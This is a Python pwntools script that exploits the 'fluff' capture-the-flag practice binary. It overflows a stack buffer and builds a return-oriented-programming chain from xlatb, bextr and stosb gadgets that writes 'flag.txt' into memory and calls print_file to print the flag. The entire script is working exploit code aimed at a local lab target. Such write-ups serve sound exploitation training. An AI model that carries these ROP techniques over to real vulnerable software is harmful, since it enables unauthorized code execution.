#!/bin/python3
from pwn import *

context.log_level = "debug"
# addresses
write_addr = 0x00601028  # data addr
print_file_addr = 0x00400510
pop_rdi = 0x004006A3
junk = 0xDEADBEEFDEADBEEF

# xlatb
# gets byte from table memory with
# register al as the index (8 bits unsigned int)
# rbx contains base addr
# returns result into al
gadget1 = 0x00400628

# pop rdx
# pop rcx
# add rcx, 0x3ef2
# bextr rbx, rcx, rdx
# extracts bits from rcx according to rdx
# result saved in rbx
gadget2 = 0x0040062A

# stosb byte [rdi], al
# stores byte from al into rdi
# writes al into rdi addr
gadget3 = 0x00400639

# saves 32bit addr in rbx


def set_rbx(addr):
    payload = b""

    # index and length of bits to copy
    # first 8 index
    rdx1 = p8(32)
    # last 8 len
    rdx2 = p8(32)
    rdx3 = p32(0) + p16(0)
    rdx = rdx1 + rdx2 + rdx3

    # address we want to copy
    # addr + 0x3ef2
    # avoid addition by leaving it blank
    # 0xXXXX0000
    # 0x00003ef2
    rcx1 = p32(0)
    rcx2 = p32(addr)
    rcx = rcx1 + rcx2

    # sets rbx
    payload += p64(gadget2) + rdx + rcx
    return payload


al = 11  # initial al value
# char is what we will write
# addr is address of target char
# offset will find the proper writing location
# returns ROP chain in bytes


def write_byte(addr, char, offset):
    global al

    # set address to get byte
    payload = set_rbx(addr - al)

    # read byte into al
    payload += p64(gadget1)
    # update al with new value
    al = ord(char)

    # write byte al into .data
    rdi = p64(write_addr + offset)
    payload += p64(pop_rdi) + rdi + p64(gadget3)
    return payload


# write flag.txt in mem
char_map = {
    "f": 0x0040058A,
    "l": 0x004003E4,
    "a": 0x00400424,
    "g": 0x004003CF,
    ".": 0x004003FD,
    "t": 0x004003E0,
    "x": 0x00400725,
}
target_str = "flag.txt"

# create payload
payload = b"A" * 40
for i in range(0, len(target_str)):
    c = target_str[i]
    payload += write_byte(char_map[c], c, i)
# print file
payload += p64(pop_rdi) + p64(write_addr) + p64(print_file_addr)

io = process("./fluff")
io.send(payload)
io.recvuntil(b"Thank you!\n")
flag = io.recvline()
log.success(flag.decode("utf-8"))
